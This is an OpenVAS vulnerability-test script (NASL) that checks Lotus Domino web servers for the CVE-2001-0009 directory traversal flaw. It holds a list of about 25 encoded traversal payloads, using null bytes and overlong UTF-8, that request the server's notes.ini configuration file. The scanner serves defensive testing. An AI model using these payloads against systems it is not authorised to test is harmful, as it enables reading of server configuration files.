###############################################################################
# OpenVAS Vulnerability Test
#
# notes.ini checker
#
# Authors:
# Hemil Shah
#
# Copyright:
# Copyright (C) 2005 Net-Square Solutions Pvt Ltd.
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:ibm:lotus_domino";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.12248");
  script_version("2022-05-12T09:32:01+0000");
  script_tag(name:"last_modification", value:"2022-05-12 09:32:01 +0000 (Thu, 12 May 2022)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_cve_id("CVE-2001-0009");

  script_name("Lotus Domino Server Directory Traversal Vulnerability");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2005 Net-Square Solutions Pvt Ltd.");
  script_family("Web application abuses");
  script_dependencies("gb_hcl_domino_consolidation.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("hcl/domino/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/2173");

  script_tag(name:"summary", value:"This plugin attempts to determine the existence of a directory
  traversal bug on the remote Lotus Domino Web server.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_active");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

req = http_get(item:dir + "../../../../whatever.ini", port:port);
res = http_keepalive_send_recv(port:port, data:req);
if(!res || ereg(pattern:"^HTTP/[01]\.[01] 200", string:res))
  exit(0);

checks = make_list(
dir + "/%00%00.nsf/../lotus/domino/notes.ini",
dir + "/%00%20.nsf/../lotus/domino/notes.ini",
dir + "/%00%c0%af.nsf/../lotus/domino/notes.ini",
dir + "/%00...nsf/../lotus/domino/notes.ini",
dir + "/%00.nsf//../lotus/domino/notes.ini",
dir + "/%00.nsf/../lotus/domino/notes.ini",
dir + "/%00.nsf/..//lotus/domino/notes.ini",
dir + "/%00.nsf/../../lotus/domino/notes.ini",
dir + "/%00.nsf.nsf/../lotus/domino/notes.ini",
dir + "/%20%00.nsf/../lotus/domino/notes.ini",
dir + "/%20.nsf//../lotus/domino/notes.ini",
dir + "/%20.nsf/..//lotus/domino/notes.ini",
dir + "/%c0%af%00.nsf/../lotus/domino/notes.ini",
dir + "/%c0%af.nsf//../lotus/domino/notes.ini",
dir + "/%c0%af.nsf/..//lotus/domino/notes.ini",
dir + "/...nsf//../lotus/domino/notes.ini",
dir + "/...nsf/..//lotus/domino/notes.ini",
dir + "/.nsf///../lotus/domino/notes.ini",
dir + "/.nsf//../lotus/domino/notes.ini",
dir + "/.nsf//..//lotus/domino/notes.ini",
dir + "/.nsf/../lotus/domino/notes.ini",
dir + "/.nsf/../lotus/domino/notes.ini",
dir + "/.nsf/..///lotus/domino/notes.ini",
dir + "/.nsf%00.nsf/../lotus/domino/notes.ini",
dir + "/.nsf.nsf//../lotus/domino/notes.ini");

foreach check(checks) {

  req = http_get(item:check, port:port);
  res = http_keepalive_send_recv(port:port, data:req);
  if(!res)
    continue;

  if(egrep(pattern:"^HTTP/[01]\.[01] 200", string:res) && "DEBUG" >< res) {
    report = http_report_vuln_url(port:port, url:check);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
